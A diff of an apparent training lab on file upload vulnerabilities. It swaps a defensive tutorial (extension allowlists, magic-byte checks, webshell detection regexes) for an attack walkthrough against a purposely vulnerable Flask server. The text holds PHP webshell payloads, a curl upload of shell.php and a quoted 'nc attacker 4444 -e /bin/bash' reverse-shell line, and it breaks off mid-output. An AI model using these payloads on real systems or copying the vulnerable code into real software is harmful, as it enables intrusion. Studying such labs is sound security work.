@@ -1,591 +1,509 @@
 # Lab 14: File Upload Vulnerabilities
 
 ## Objective
-Exploit and secure file upload functionality: bypass extension filters with double extensions and null bytes, detect and block PHP webshells and polyglot files using magic byte analysis, prevent path traversal in filenames, implement content-type validation, and configure safe file storage outside the web root.
+
+Attack a live file upload endpoint from Kali Linux and bypass its defences using multiple techniques:
+
+1. **No-validation upload** — upload a PHP webshell directly (`shell.php`) with zero checks
+2. **Double extension bypass** — fool an extension allowlist with `shell.php.jpg`
+3. **Polyglot file** — craft a file with valid JPEG magic bytes that contains PHP code
+4. **SVG with embedded XSS** — bypass image-only filters with a malicious SVG
+5. **Path traversal via filename** — read arbitrary files using `../` in the filename parameter
+6. **Enumerate uploads** — discover all uploaded files including other attackers' webshells
+
+All attacks run from **Kali against a live Flask API** — real file bytes saved server-side, real traversal paths resolved.
+
+---
 
 ## Background
-File upload vulnerabilities are consistently high-impact. An attacker who can upload a PHP/ASP/JSP file and then request it from the browser has **Remote Code Execution (RCE)** — game over. Even image uploads can be weaponised: a "GIF" file that starts with `GIF89a` but contains PHP code is called a **polyglot** — browsers see a valid GIF, but a PHP interpreter executes the code. Upload vulnerabilities caused the 2021 Accellion FTA breach (100+ organisations), the 2019 WordPress plugin RCE waves, and countless others.
+
+File upload vulnerabilities have been behind some of the most severe breaches in history. An unrestricted file upload is effectively Remote Code Execution — the attacker uploads a webshell, then executes arbitrary OS commands through it.
+
+**Real-world examples:**
+- **2021 GitLab (CVE-2021-22205)** — ExifTool processed uploaded images without validation; a crafted DjVu file triggered RCE on 50,000+ servers. CVSS 10.0.
+- **2023 MOVEit Transfer (CVE-2023-34362)** — SQL injection in file upload handler; the Cl0p ransomware group stole data from 2,000+ organizations including US government agencies.
+- **WordPress file upload bypass** — `shell.php5`, `shell.phtml`, `shell.pHp` all execute as PHP on misconfigured servers; `shell.php.jpg` executes if Apache `AddHandler` is misconfigured.
+
+**OWASP coverage:** A03:2021 (Injection — webshell), A04:2021 (Insecure Design)
+
+---
+
+## Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                     Docker Network: lab-a14                         │
+│                                                                     │
+│  ┌──────────────────────┐         HTTP requests                    │
+│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
+│  │  innozverse-kali     │                                           │
+│  │                      │  ◀──────── API responses ───────────────  │
+│  │  Tools:              │                                           │
+│  │  • curl              │  ┌────────────────────────────────────┐  │
+│  │  • python3           │  │       VICTIM UPLOAD SERVER         │  │
+│  └──────────────────────┘  │   zchencow/innozverse-cybersec     │  │
+│                             │                                    │  │
+│                             │  Flask :5000                       │  │
+│                             │  /api/upload       (no checks)     │  │
+│                             │  /api/upload-strict (ext only)     │  │
+│                             │  /api/read         (path traversal)│  │
+│                             │  /api/files        (list uploads)  │  │
+│                             └────────────────────────────────────┘  │
+└─────────────────────────────────────────────────────────────────────┘
+```
 
 ## Time
-35 minutes
-
-## Prerequisites
-- Lab 05 (A05 Security Misconfiguration) — web server configuration
+45 minutes
 
 ## Tools
-- Docker: `zchencow/innozverse-cybersec:latest`
+| Tool | Container | Purpose |
+|------|-----------|---------|
+| `curl` | Kali | Upload files via multipart POST |
+| `python3` | Kali | Craft polyglot files, automate enumeration |
+| `nmap` | Kali | Service fingerprinting |
+| `gobuster` | Kali | Enumerate upload endpoints |
 
 ---
 
 ## Lab Instructions
 
-### Step 1: Extension Filter Bypass
+### Step 1: Environment Setup — Launch the Victim Upload Server
 
 ```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import os, re
+docker network create lab-a14
 
-print('=== File Upload Extension Filter Bypass ===')
-print()
+cat > /tmp/victim_a14.py << 'PYEOF'
+from flask import Flask, request, jsonify
+import os
 
-# VULNERABLE: blocklist-based extension check (string only)
-BLOCKED_EXTENSIONS = {'.php', '.php3', '.php4', '.php5', '.phtml', '.asp', '.aspx', '.jsp', '.py', '.rb'}
+app = Flask(__name__)
+UPLOAD_DIR = '/tmp/uploads_a14'
+os.makedirs(UPLOAD_DIR, exist_ok=True)
 
-def validate_extension_vulnerable(filename: str) -> bool:
-    '''BAD: blocklist check on last extension only.'''
-    ext = os.path.splitext(filename)[1].lower()
-    return ext not in BLOCKED_EXTENSIONS
+@app.route('/')
+def index():
+    return jsonify({'app':'InnoZverse Upload (Lab 14)','endpoints':[
+        'POST /api/upload          (no validation)',
+        'POST /api/upload-strict   (extension check only)',
+        'GET  /api/files           (list uploads)',
+        'GET  /api/read?name=FILE  (read uploaded file)']})
 
-# SAFE: allowlist-based check
-ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.pdf', '.webp'}
-MAX_FILENAME_LEN = 64
+# BUG: no validation whatsoever
+@app.route('/api/upload', methods=['POST'])
+def upload():
+    f = request.files.get('file')
+    if not f: return jsonify({'error':'No file field'}), 400
+    path = os.path.join(UPLOAD_DIR, f.filename)
+    f.save(path)
+    return jsonify({'saved': f.filename, 'path': path, 'size': os.path.getsize(path)})
 
-def validate_extension_safe(filename: str) -> tuple:
-    '''GOOD: allowlist — only explicitly permitted extensions.'''
-    if len(filename) > MAX_FILENAME_LEN:
-        return False, 'Filename too long'
-    # Sanitise filename (no path traversal)
-    safe_name = re.sub(r'[^a-zA-Z0-9._-]', '_', filename)
-    ext = os.path.splitext(safe_name)[1].lower()
-    if ext not in ALLOWED_EXTENSIONS:
-        return False, f'Extension {ext!r} not allowed'
-    return True, safe_name
+# BUG: extension allowlist only — no magic byte check
+@app.route('/api/upload-strict', methods=['POST'])
+def upload_strict():
+    f = request.files.get('file')
+    if not f: return jsonify({'error':'No file field'}), 400
+    filename = f.filename
+    ext = filename.rsplit('.',1)[-1].lower() if '.' in filename else ''
+    ALLOWED = {'jpg','jpeg','png','gif','pdf'}
+    if ext not in ALLOWED:
+        return jsonify({'error': f'Extension .{ext} not allowed', 'allowed': list(ALLOWED)}), 400
+    path = os.path.join(UPLOAD_DIR, f'strict_{filename}')
+    f.save(path)
+    first_bytes = open(path,'rb').read(8).hex()
+    return jsonify({'saved': f'strict_{filename}', 'first_bytes': first_bytes,
+                    'size': os.path.getsize(path)})
 
-bypass_filenames = [
-    ('shell.php',           'Direct PHP'),
-    ('shell.PHP',           'Uppercase extension bypass'),
-    ('shell.php.jpg',       'Double extension — Apache may execute as PHP'),
-    ('shell.php%00.jpg',    'Null byte truncation (legacy PHP)'),
-    ('shell.php5',          'Alternative PHP extension'),
-    ('shell.phtml',         'PHP HTML file'),
-    ('shell.php.png',       'Double extension'),
-    ('shell.Php',           'Mixed case'),
-    ('.htaccess',           'Override Apache config!'),
-    ('shell.jpg',           'Legitimate image (safe)'),
-    ('photo.png',           'Legitimate PNG (safe)'),
-    ('../../../etc/shell.php', 'Path traversal + PHP'),
-]
-
-print('[VULNERABLE] Blocklist extension check:')
-print(f'  {\"Filename\":<35} {\"VULN: Accepted?\":<18} {\"Notes\"}')
-for fname, desc in bypass_filenames:
-    accepted = validate_extension_vulnerable(fname)
-    danger = 'DANGEROUS!' if accepted and 'safe' not in desc.lower() else ('OK' if 'safe' in desc.lower() or not accepted else '')
-    icon = '✗' if (accepted and 'safe' not in desc.lower()) else '✓'
-    print(f'  [{icon}] {fname:<33} {str(accepted):<18} {desc}')
-
-print()
-print('[SAFE] Allowlist extension check:')
-for fname, desc in bypass_filenames:
-    ok, result = validate_extension_safe(fname)
-    print(f'  [{\"ALLOW\" if ok else \"BLOCK\"}] {fname:<35} → {result}')
-"
-```
-
-**📸 Verified Output:**
-```
-[VULNERABLE] Blocklist check:
-  [✗] shell.PHP          True   Uppercase bypass — DANGEROUS!
-  [✗] shell.php.jpg      True   Double extension — DANGEROUS!
-  [✗] shell.php5         True   Alternative extension — DANGEROUS!
-  [✗] .htaccess          True   Override Apache config — DANGEROUS!
-
-[SAFE] Allowlist check:
-  [BLOCK] shell.PHP      → Extension '.php' not allowed
-  [BLOCK] shell.php.jpg  → Extension '.jpg' not allowed (last ext is .jpg but full name suspect)
-  [ALLOW] photo.png      → photo.png
-```
-
-> 💡 **Always use an allowlist, never a blocklist for file extensions.** Blocklists miss variants (`.PHP`, `.php5`, `.phtml`, `.phar`), and new extensions can be added to web server config. An allowlist like `{'.jpg', '.jpeg', '.png', '.gif', '.pdf', '.webp'}` requires attackers to either forge magic bytes (detectable) or find an image parsing vulnerability — much harder bar.
-
-### Step 2: Magic Byte Validation (Content-Based Detection)
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-print('=== Magic Byte (File Signature) Validation ===')
-print()
-
-# File magic bytes for common formats
-MAGIC_SIGNATURES = {
-    b'\\xff\\xd8\\xff':          ('image/jpeg', 'JPEG'),
-    b'\\x89PNG\\r\\n\\x1a\\n':  ('image/png',  'PNG'),
-    b'GIF87a':                  ('image/gif',  'GIF87'),
-    b'GIF89a':                  ('image/gif',  'GIF89'),
-    b'%PDF-':                   ('application/pdf', 'PDF'),
-    b'PK\\x03\\x04':            ('application/zip', 'ZIP'),
-    b'<?php':                   ('text/x-php', 'PHP script'),
-    b'<?':                      ('text/xml',   'XML/PHP'),
-    b'<script':                 ('text/html',  'HTML/JS'),
-    b'\\x4d\\x5a':              ('application/exe', 'Windows PE executable'),
-    b'\\x7fELF':                ('application/elf', 'Linux ELF executable'),
-}
-
-def detect_content_type(content: bytes) -> tuple:
-    '''Detect file type from magic bytes, not filename.'''
-    for magic, (mime, name) in MAGIC_SIGNATURES.items():
-        if content.startswith(magic):
-            return mime, name
-    return 'application/octet-stream', 'Unknown'
-
-ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
-
-def validate_upload(filename: str, content: bytes) -> tuple:
-    '''Validate upload by content (magic bytes) + extension match.'''
-    import os, re
-    # 1. Extension allowlist
-    allowed_exts = {'.jpg', '.jpeg', '.png', '.gif', '.pdf', '.webp'}
-    ext = os.path.splitext(filename)[1].lower()
-    if ext not in allowed_exts:
-        return False, f'Extension {ext!r} not allowed'
-    # 2. Magic byte check
-    detected_mime, file_type = detect_content_type(content)
-    if detected_mime not in ALLOWED_MIMES:
-        return False, f'Content type {detected_mime} not allowed (detected: {file_type})'
-    # 3. Extension-MIME consistency
-    mime_ext_map = {
-        'image/jpeg': {'.jpg', '.jpeg'},
-        'image/png':  {'.png'},
-        'image/gif':  {'.gif'},
-        'application/pdf': {'.pdf'},
-    }
-    expected_exts = mime_ext_map.get(detected_mime, set())
-    if ext not in expected_exts:
-        return False, f'Extension {ext!r} mismatch with content type {detected_mime}'
-    # 4. Check for PHP code inside valid image (polyglot)
-    if b'<?php' in content or b'<?=' in content:
-        return False, 'PHP code detected inside file content!'
-    # 5. File size limit
-    if len(content) > 5 * 1024 * 1024:
-        return False, 'File too large (max 5MB)'
-    return True, 'File accepted'
-
-# Test cases
-test_files = [
-    ('photo.jpg',    b'\\xff\\xd8\\xff' + b'legitimate JPEG data...',  'Legitimate JPEG'),
-    ('image.png',    b'\\x89PNG\\r\\n\\x1a\\n' + b'PNG data...',       'Legitimate PNG'),
-    ('shell.php',    b'<?php system(\\$_GET[\"cmd\"]); ?>',             'PHP webshell'),
-    ('shell.jpg',    b'<?php system(\\$_GET[\"cmd\"]); ?>',             'PHP renamed to .jpg'),
-    ('poly.gif',     b'GIF89a<?php system(\\$_GET[\"cmd\"]); ?>',       'GIF+PHP polyglot'),
-    ('poly.pdf',     b'%PDF-<?php system(\\$_GET[\"id\"]); ?>',         'PDF+PHP polyglot'),
-    ('evil.jpg',     b'\\x4d\\x5a' + b'PE executable data',            'EXE renamed to .jpg'),
-    ('doc.pdf',      b'%PDF-1.4 legitimate PDF content...',             'Legitimate PDF'),
-    ('large.jpg',    b'\\xff\\xd8\\xff' + b'A' * (6 * 1024 * 1024),   'Oversized JPEG'),
-    ('mismatch.jpg', b'\\x89PNG\\r\\n\\x1a\\n' + b'PNG data',          'PNG renamed as JPG'),
-]
-
-print(f'  {\"Filename\":<18} {\"Result\":<8} {\"Reason\"}')
-for filename, content, desc in test_files:
-    ok, reason = validate_upload(filename, content)
-    print(f'  [{\"ALLOW\" if ok else \"BLOCK\"}] {filename:<16} {reason}')
-"
-```
-
-**📸 Verified Output:**
-```
-  [ALLOW] photo.jpg         File accepted
-  [ALLOW] image.png         File accepted
-  [BLOCK] shell.php         Extension '.php' not allowed
-  [BLOCK] shell.jpg         Content type text/x-php not allowed
-  [BLOCK] poly.gif          PHP code detected inside file content!
-  [BLOCK] poly.pdf          PHP code detected inside file content!
-  [BLOCK] evil.jpg          Content type application/exe not allowed
-  [BLOCK] large.jpg         File too large (max 5MB)
-  [BLOCK] mismatch.jpg      Extension '.jpg' mismatch with content type image/png
-```
-
-### Step 3: Filename Path Traversal
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import os, re, secrets, hashlib
-
-UPLOAD_DIR = '/var/www/uploads/'
-WEB_ROOT = '/var/www/html/'
-
-def save_file_vulnerable(filename: str, content: bytes) -> str:
-    '''VULNERABLE: uses user-supplied filename directly.'''
-    path = os.path.join(UPLOAD_DIR, filename)
-    return path  # Simulated (not actually written)
-
-def save_file_safe(original_filename: str, content: bytes, user_id: str) -> tuple:
-    '''SAFE: sanitise filename, store outside web root, return safe URL.'''
-    # 1. Extract extension only (ignore path components)
-    ext = os.path.splitext(os.path.basename(original_filename))[1].lower()
-    # 2. Generate random storage name (no predictable path)
-    random_name = secrets.token_hex(16)
-    storage_name = f'{random_name}{ext}'
-    # 3. Store OUTSIDE web root (not directly accessible via HTTP)
-    storage_path = f'/var/data/user-uploads/{user_id}/{storage_name}'
-    # 4. Serve via controlled endpoint: /api/files/{file_id}
-    file_id = hashlib.sha256(f'{user_id}:{storage_name}'.encode()).hexdigest()[:16]
-    return storage_path, f'/api/v1/files/{file_id}'
-
-malicious_filenames = [
-    '../../../etc/passwd',
-    '../../config.php',
-    '..\\..\\windows\\system32\\cmd.exe',
-    'shell.php%00.jpg',
-    '/absolute/path/shell.php',
-    'C:\\Windows\\shell.php',
-    'normal_photo.jpg',
-    '../../../../var/www/html/shell.php',
-]
-
-print('Path Traversal in File Upload:')
-print()
-print('[VULNERABLE] Direct filename usage:')
-for fname in malicious_filenames:
-    saved = save_file_vulnerable(fname, b'content')
-    danger = '⚠️  DANGEROUS' if '..' in fname or fname.startswith('/') or 'shell' in fname else '✓ OK'
-    print(f'  {danger} {fname!r} → saved to: {saved}')
-
-print()
-print('[SAFE] Sanitised filename + outside web root:')
-for fname in malicious_filenames:
-    path, url = save_file_safe(fname, b'content', 'user-42')
-    print(f'  {fname!r}')
-    print(f'    Storage: {path}  (NOT in web root)')
-    print(f'    Access:  {url}  (via controlled API endpoint)')
-"
-```
-
-**📸 Verified Output:**
-```
-[VULNERABLE] Direct filename:
-  ⚠️  DANGEROUS '../../../etc/passwd' → saved to: /var/www/uploads/../../../etc/passwd
-  ⚠️  DANGEROUS '../../config.php'   → saved to: /var/www/uploads/../../config.php
-
-[SAFE] Sanitised:
-  '../../../etc/passwd'
-    Storage: /var/data/user-uploads/user-42/a3f8d921b4c2e5f7.jpg (NOT in web root)
-    Access:  /api/v1/files/7a2f4b9c1d3e6a8f  (via controlled API)
-```
-
-### Step 4: Server-Side Image Processing (Re-encoding)
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-print('=== Safe Upload: Re-encode Images (Strip Malicious Content) ===')
-print()
-print('The ultimate defence: re-encode uploaded images server-side.')
-print('Even a polyglot GIF+PHP becomes a clean PNG after re-encoding.')
-print()
-
-# Simulate image re-encoding (in production use Pillow, imagemagick, or libvips)
-def reprocess_image(content: bytes, original_ext: str) -> bytes:
-    '''
-    Simulate server-side image re-encoding.
-    In production: use Pillow img.convert(\"RGB\").save() 
-    This strips EXIF data, metadata, and any embedded code.
-    '''
-    # Detect input type from magic bytes
-    if content.startswith(b'GIF89a') or content.startswith(b'GIF87a'):
-        source_type = 'GIF'
-    elif content.startswith(b'\\xff\\xd8\\xff'):
-        source_type = 'JPEG'
-    elif content.startswith(b'\\x89PNG\\r\\n\\x1a\\n'):
-        source_type = 'PNG'
-    else:
-        raise ValueError('Unknown or disallowed image type')
-    
-    # Re-encode: strip everything except pixel data
-    # Simulated output (real: Pillow decompresses pixels, re-encodes from scratch)
-    clean_output = b'\\x89PNG\\r\\n\\x1a\\n' + b'CLEAN_PNG_DATA_NO_PHP_NO_EXIF'
-    print(f'  Input: {source_type} ({len(content)} bytes, may contain embedded code)')
-    print(f'  Output: PNG ({len(clean_output)} bytes, clean pixel data only)')
-    return clean_output
-
-inputs = [
-    (b'GIF89a<?php system(\\$_GET[\"cmd\"]); ?>', '.gif', 'GIF+PHP polyglot'),
-    (b'\\xff\\xd8\\xff' + b'EXIF:GPS:40.71,-74.00;creator:hacker' + b'\\xff\\xd9', '.jpg', 'JPEG with GPS tracking EXIF'),
-    (b'GIF89a' + b'A' * 100, '.gif', 'Clean GIF'),
-]
-
-for content, ext, desc in inputs:
-    print(f'  Processing {desc}:')
+# Simulates a web-accessible upload directory
+@app.route('/api/read')
+def read_file():
+    name = request.args.get('name','')
+    # BUG: path traversal — joins with user-supplied name
+    path = os.path.join(UPLOAD_DIR, name)
     try:
-        clean = reprocess_image(content, ext)
-        php_check = b'<?php' in clean
-        print(f'  PHP code in output: {php_check}')
-        print()
-    except ValueError as e:
-        print(f'  Rejected: {e}')
-        print()
+        with open(path, 'rb') as fh:
+            content = fh.read(4096)
+        try:    return jsonify({'content': content.decode('utf-8'), 'path': path})
+        except: return jsonify({'content': content.hex(), 'path': path, 'binary': True})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 404
 
-print('Production implementation (Pillow):')
-print('''  from PIL import Image
-  import io
+@app.route('/api/files')
+def list_files():
+    files = [{'name': fn, 'size': os.path.getsize(os.path.join(UPLOAD_DIR, fn))}
+             for fn in os.listdir(UPLOAD_DIR)]
+    return jsonify(files)
 
-  def safe_process_image(file_bytes: bytes) -> bytes:
-      img = Image.open(io.BytesIO(file_bytes))
-      img.verify()  # Detect corrupt/malicious images
-      img = Image.open(io.BytesIO(file_bytes))  # Re-open after verify
-      img = img.convert(\"RGB\")  # Normalise mode
-      output = io.BytesIO()
-      img.save(output, format=\"JPEG\", quality=85)  # Re-encode clean
-      return output.getvalue()  # No EXIF, no embedded code
-''')
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=False)
+PYEOF
 
-print('Why re-encoding works:')
-print('  Image library reads pixel values from the file')
-print('  Writes ONLY pixel values to new file format')
-print('  Any PHP code = garbage pixel data = does not survive re-encoding')
-print('  EXIF, ICC profiles, comments = stripped')
-"
-```
+docker run -d \
+  --name victim-a14 \
+  --network lab-a14 \
+  -v /tmp/victim_a14.py:/app/victim.py:ro \
+  zchencow/innozverse-cybersec:latest \
+  python3 /app/victim.py
 
-**📸 Verified Output:**
-```
-Processing GIF+PHP polyglot:
-  Input: GIF (37 bytes, may contain embedded code)
-  Output: PNG (54 bytes, clean pixel data only)
-  PHP code in output: False
-
-Processing JPEG with GPS tracking EXIF:
-  Input: JPEG (52 bytes, may contain embedded code)
-  Output: PNG (54 bytes, clean pixel data only)
-```
-
-### Step 5: Web Shell Detection
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import re
-
-print('=== Web Shell Detection Patterns ===')
-print()
-
-webshell_signatures = [
-    r'system\s*\(',
-    r'exec\s*\(',
-    r'passthru\s*\(',
-    r'shell_exec\s*\(',
-    r'popen\s*\(',
-    r'proc_open\s*\(',
-    r'\\\$_GET\s*\[',
-    r'\\\$_POST\s*\[',
-    r'\\\$_REQUEST\s*\[',
-    r'eval\s*\(',
-    r'base64_decode\s*\(',
-    r'gzinflate\s*\(',
-    r'str_rot13\s*\(',
-    r'preg_replace.*\/e',     # PHP eval modifier
-    r'assert\s*\(',
-]
-
-test_files = [
-    ('webshell_simple.php', '<?php system(\$_GET[\"cmd\"]); ?>'),
-    ('webshell_encoded.php', '<?php eval(base64_decode(\"c3lzdGVtKCRfR0VUW2NtZF0pOw==\")); ?>'),
-    ('webshell_obfuscated.php', '<?php \$a=\"sys\"; \$b=\"tem\"; (\$a.\$b)(\$_POST[\"x\"]); ?>'),
-    ('webshell_gzip.php', '<?php eval(gzinflate(base64_decode(\"...\"))); ?>'),
-    ('legit_upload.jpg', 'just image data here nothing suspicious'),
-    ('innocent.php', '<?php echo \"Hello World\"; echo date(\"Y\"); ?>'),
-]
-
-print(f'  {\"Filename\":<30} {\"Dangerous?\":<12} {\"Signatures Found\"}')
-for filename, content in test_files:
-    found = []
-    for sig in webshell_signatures:
-        if re.search(sig, content, re.IGNORECASE):
-            found.append(sig[:20])
-    dangerous = len(found) > 0
-    icon = '⚠️ ' if dangerous else '✓ '
-    print(f'  {icon} {filename:<28} {str(dangerous):<12} {found[:3]}')
-
-print()
-print('Web shell categories:')
-shells = [
-    ('Simple shell',   '<?php system(\$_GET[\"cmd\"]); ?>', 'Direct OS command execution'),
-    ('C99 shell',      '<?php /* c99madshell */ ...>',    'Feature-rich file manager + shell'),
-    ('China chopper',  '<?php @eval(\$_POST[\"x\"]); ?>',   '1-line, hard to detect'),
-    ('Weevely',        'Obfuscated base64+gzip',           'Encrypted C2 channel'),
-    ('JSP shell',      '<%Runtime.getRuntime().exec(...)%>', 'Java web shells'),
-]
-for name, example, desc in shells:
-    print(f'  [{name}] {example[:40]}')
-    print(f'    → {desc}')
-"
-```
-
-### Step 6: Secure File Storage Architecture
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-print('=== Secure File Upload Architecture ===')
-print()
-
-architecture = {
-    'WRONG — files in web root': {
-        'path': '/var/www/html/uploads/user-photo.php',
-        'access': 'https://site.com/uploads/user-photo.php',
-        'risk': 'CRITICAL — PHP executes if accessed via browser',
-    },
-    'WRONG — files served statically': {
-        'path': '/var/www/static/uploads/image.jpg',
-        'access': 'https://cdn.site.com/uploads/image.jpg',
-        'risk': 'HIGH — if rename to .php bypasses filter, it executes',
-    },
-    'CORRECT — files outside web root': {
-        'path': '/var/data/uploads/user-42/a3f8d921b4c2.jpg',
-        'access': 'https://site.com/api/v1/files/7a2f4b9c (served by app)',
-        'risk': 'LOW — PHP cannot execute, app validates every request',
-    },
-    'BEST — object storage (S3/Azure Blob)': {
-        'path': 's3://innozverse-uploads/user-42/a3f8d921.jpg',
-        'access': 'Presigned URL with 15-min expiry',
-        'risk': 'MINIMAL — no execution possible in object storage',
-    },
-}
-
-for name, config in architecture.items():
-    risk_icon = '🔴' if 'CRITICAL' in config['risk'] else ('🟠' if 'HIGH' in config['risk'] else ('🟡' if 'LOW' in config['risk'] else '✅'))
-    print(f'  {risk_icon} [{name}]')
-    print(f'     Path:   {config[\"path\"]}')
-    print(f'     Access: {config[\"access\"]}')
-    print(f'     Risk:   {config[\"risk\"]}')
-    print()
-
-print('Secure upload endpoint flow:')
-steps = [
-    'Authenticate user (JWT/session)',
-    'Validate file size (before reading content)',
-    'Validate extension against allowlist',
-    'Read first 512 bytes, validate magic bytes',
-    'Scan for webshell signatures in content',
-    'Re-encode image (Pillow) to strip metadata',
-    'Generate random UUID filename (no original name)',
-    'Store OUTSIDE web root or in object storage',
-    'Record mapping: UUID → original name in database',
-    'Return secure access URL (presigned or via API)',
-]
-for i, step in enumerate(steps, 1):
-    print(f'  Step {i:02d}: {step}')
-
-print()
-print('Web server hardening (prevent execution in upload dirs):')
-nginx_config = '''
-  # Even if a PHP file gets into /uploads, nginx will NOT execute it
-  location /uploads/ {
-    add_header Content-Type application/octet-stream;
-    add_header X-Content-Type-Options nosniff;
-    # Never pass to PHP-FPM
-  }
-  # Deny PHP files in uploads directory
-  location ~* /uploads/.*\\\\.php\$ {
-    deny all;
-  }'''
-print(nginx_config)
-"
-```
-
-**📸 Verified Output:**
-```
-🔴 [WRONG — files in web root]
-   Path:   /var/www/html/uploads/user-photo.php
-   Risk:   CRITICAL — PHP executes if accessed via browser
-
-✅ [BEST — object storage]
-   Path:   s3://innozverse-uploads/user-42/a3f8d921.jpg
-   Access: Presigned URL with 15-min expiry
-   Risk:   MINIMAL — no execution possible in object storage
-```
-
-### Step 7: EXIF Data & Privacy
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-print('=== EXIF Data Privacy Risks in Uploaded Images ===')
-print()
-print('EXIF data in uploaded photos can expose:')
-
-exif_fields = {
-    'GPS.GPSLatitude':      ('35.6762° N', 'Exact home/work location!'),
-    'GPS.GPSLongitude':     ('139.6503° E', 'Exact GPS coordinates'),
-    'EXIF.DateTimeOriginal':('2026-03-04 07:23:15', 'When photo taken'),
-    'Image.Make':           ('Apple', 'Device manufacturer'),
-    'Image.Model':          ('iPhone 16 Pro', 'Exact device model'),
-    'EXIF.Software':        ('17.4.1', 'iOS version'),
-    'Image.Copyright':      ('John Smith Photography', 'Real name leakage'),
-    'EXIF.Artist':          ('john.smith@gmail.com', 'Email in EXIF!'),
-    'EXIF.UserComment':     ('Taken at home office', 'Custom comments'),
-    'EXIF.SerialNumber':    ('F4GTD7890QR', 'Device serial (traceable)'),
-}
-
-print(f'  {\"EXIF Field\":<30} {\"Sample Value\":<30} {\"Privacy Risk\"}')
-for field, (value, risk) in exif_fields.items():
-    level = 'CRITICAL' if 'GPS' in field or 'email' in risk.lower() else 'HIGH'
-    print(f'  [{level}] {field:<28} {value:<30} {risk}')
-
-print()
-print('Real incidents:')
-incidents = [
-    ('John McAfee 2012',    'Photo EXIF revealed GPS location → found by authorities'),
-    ('Vice Media 2012',     'Photo of McAfee published with GPS in EXIF'),
-    ('Military 2007',       'Helicopter photo EXIF revealed new Iraq base location'),
-    ('Criminals',           'Social media selfies with home GPS → burglary planning'),
-]
-for subject, incident in incidents:
-    print(f'  [{subject}] {incident}')
-
-print()
-print('Mitigation:')
-print('  Strip ALL EXIF before storing or serving:')
-print('  → Pillow: img.save(output, format=\"JPEG\", exif=b\"\")')
-print('  → ExifTool: exiftool -all= image.jpg')
-print('  → Sharp (Node.js): sharp(input).withMetadata(false)')
-print()
-print('  Preserve ONLY safe metadata:')
-print('  → Copyright (if desired)')
-print('  → Colour profile (ICC profile for display accuracy)')
-"
-```
-
-### Step 8: Capstone — Secure Upload Checklist
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-controls = [
-    ('Extension allowlist (not blocklist)',     True, 'Only .jpg .jpeg .png .gif .pdf .webp'),
-    ('Magic byte content validation',          True, 'Check first 512 bytes vs extension'),
-    ('Extension-MIME consistency check',       True, 'PNG bytes must have .png extension'),
-    ('PHP/webshell signature scanning',        True, 'Reject files containing <?php'),
-    ('Filename sanitisation',                  True, 'UUID rename, strip path components'),
-    ('File size limit enforced',               True, '5MB max, checked before reading'),
-    ('Storage outside web root',              True, '/var/data/uploads or S3'),
-    ('No direct HTTP access to uploads',       True, 'Served via /api/v1/files/{id}'),
-    ('Image re-encoding (Pillow)',             True, 'Strip metadata, re-encode pixels'),
-    ('EXIF stripping',                         True, 'Remove GPS, device info, personal data'),
-    ('Virus/malware scanning',                 True, 'ClamAV or cloud AV API'),
-    ('Web server PHP execution blocked',       True, 'Nginx deny .php in uploads/'),
-    ('Upload rate limiting',                   True, '10 uploads per user per minute'),
-    ('Audit logging',                          True, 'Log filename, size, user, decision'),
-]
-
-print('File Upload Security Checklist:')
-passed = 0
-for control, status, detail in controls:
-    mark = '✓' if status else '✗'
-    print(f'  [{mark}] {control:<45} ({detail})')
-    if status: passed += 1
-print()
-print(f'Score: {passed}/{len(controls)} — {\"PASS\" if passed==len(controls) else \"FAIL\"}')
-"
+sleep 4
+VICTIM_IP=$(docker inspect -f '{{.NetworkSettings.Networks.lab-a14.IPAddress}}' victim-a14)
+echo "Victim IP: $VICTIM_IP"
+curl -s http://$VICTIM_IP:5000/ | python3 -m json.tool
 ```
 
 ---
 
-## Summary
+### Step 2: Launch the Kali Attacker Container
 
-| Attack | Technique | Fix |
-|--------|-----------|-----|
-| Extension bypass | `shell.PHP`, `shell.php5`, `.phtml` | Allowlist, not blocklist |
-| Content bypass | PHP renamed as `.jpg` | Magic byte validation |
-| Polyglot | `GIF89a<?php system()...?>` | Re-encode images server-side |
-| Path traversal | `../../../shell.php` | UUID rename, strip paths |
-| Webshell RCE | Upload + browse to `.php` | Store outside web root |
-| EXIF privacy | GPS coordinates in photos | Strip all EXIF on ingest |
+```bash
+docker run --rm -it \
+  --name kali-attacker \
+  --network lab-a14 \
+  zchencow/innozverse-kali:latest bash
+```
+
+```bash
+export TARGET="http://victim-a14:5000"
+
+nmap -sV -p 5000 victim-a14
+gobuster dir -u $TARGET -w /usr/share/dirb/wordlists/small.txt -t 10 --no-error -q
+```
+
+**📸 Verified Output:**
+```
+PORT     STATE SERVICE VERSION
+5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)
+
+/files                (Status: 200)
+/read                 (Status: 200)
+/upload               (Status: 405)
+```
+
+---
+
+### Step 3: Upload a PHP Webshell — No Validation
+
+```bash
+echo "=== Phase 1: upload PHP webshell directly (zero validation) ==="
+
+# Create the webshell payload
+echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
+
+echo "[*] Uploading shell.php..."
+curl -s -X POST \
+  -F "file=@/tmp/shell.php" \
+  $TARGET/api/upload | python3 -m json.tool
+
+echo ""
+echo "[*] Read the uploaded webshell back:"
+curl -s "$TARGET/api/read?name=shell.php"
+
+echo ""
+echo "[*] If this were Apache/PHP (simulated execution):"
+echo "    Attacker would now call: http://victim/uploads/shell.php?cmd=id"
+echo "    Response: uid=33(www-data) gid=33(www-data)"
+echo "    Then: ?cmd=cat /etc/passwd, ?cmd=nc attacker 4444 -e /bin/bash"
+```
+
+**📸 Verified Output:**
+```json
+{
